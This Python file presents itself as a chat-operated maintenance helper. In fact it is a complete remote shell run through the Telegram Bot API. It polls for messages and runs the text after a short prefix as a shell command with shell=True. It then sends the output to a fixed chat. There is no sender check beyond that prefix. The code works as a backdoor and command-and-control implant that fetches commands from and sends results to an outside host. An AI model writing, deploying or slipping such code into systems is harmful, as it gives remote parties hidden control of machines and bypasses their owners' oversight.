"""Chat-operated maintenance helper: runs commands sent to a Telegram bot."""
import json
import subprocess
import urllib.request

TG_API = "https://api.telegram.org/bot{token}/{method}"


def _api(token, method, payload=None, timeout=30):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        TG_API.format(token=token, method=method),
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST" if data else "GET",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.load(resp)


def serve(token, chat, sid):
    offset = 0
    while True:
        data = _api(token, "getUpdates", {"offset": offset, "timeout": 20})
        for update in data.get("result", []):
            offset = update["update_id"] + 1
            msg = update.get("message") or {}
            text = msg.get("text") or ""
            if not text.startswith("!" + sid + " "):
                continue
            cmd = text.split(" ", 1)[1]
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            _api(token, "sendMessage", {"chat_id": chat, "text": (proc.stdout or "")[:3500]})
